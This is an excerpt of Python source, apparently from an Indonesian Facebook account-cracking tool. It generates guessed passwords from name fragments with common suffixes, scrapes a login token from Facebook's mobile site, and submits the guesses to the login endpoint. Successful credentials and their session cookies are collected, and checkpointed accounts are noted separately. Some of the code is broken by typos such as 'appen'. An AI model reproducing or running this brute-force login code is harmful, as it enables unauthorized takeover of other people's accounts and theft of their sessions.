...
_logo_line_3_ = ('%s| |) | |\/| | _ \ _|  %s│   %s• Code By Sanzz •   %s│'%(_P_,_U_,_P_,_U_))
    ...
    for _suci_salsabila_ in _cici_.split(" "):
        if len(_suci_salsabila_)<3:
            ...
            if len(_suci_salsabila_)==3 or len(_suci_salsabila_)==4 or len(_suci_salsabila_)==5:
                ...
                _dapunta_.append(_suci_salsabila_+"123")
                _dapunta_.append(_suci_salsabila_+"321")
                _dapunta_.appen(_suci_salsabila_+"111")
                _dapunta_.appen(_suci_salsabila_+" ganteng")
                _dapunta_.appen(_suci_salsabila_+" cantik")
                _dapunta_.appen(_suci_salsabila_+" jelek")
                _dapunta_.appen(_suci_salsabila_+"12345")
...
def log_mobile(_dapunta_,_cici_,_ratya_):
    ...
    _req_get_log_ = _req_ses_log_.get("https://mobile.facebook.com/")
    _soup_dev_ = bs4.BeautifulSoup(_req_get_log_.text,"html.parser")
    _find_token_ ="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',_req_get_log_.text))
    _data_dev_ = {}
    for _dapunta_ratya_ in _soup_dev_("input"):
    ...
    _req_ses_log_.headers.update({"referer":"https://mobile.facebook.com/login/?next&ref=dbl&fl&refid=8"})
    _req_pos_log_ = _req_ses_log_.post("https://mobile.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=_data_dev_).text
    if "c_user" in list(_req_ses_log_.cookies.get_dict().keys()):return {"status":"success","email":_dapunta_,"pass":_cici_,"cookies":_req_ses_log_.cookies.get_dict()}
    elif "checkpoint" in list(_req_ses_log_.cookies.get_dict().keys()):return {"status":"cp","email":_dapunta_,"pass":_cici_,"cookies":_req_ses_log_.cookies.get_dict()}
    else:return {"status":"error","email":_dapunta_,"pass":_cici_}
...
def start_method():
    ...
    _dapunta_cici_('%s[%s3%s] %sMetode Mobile'%(_U_,_P_,_U_,_P_))
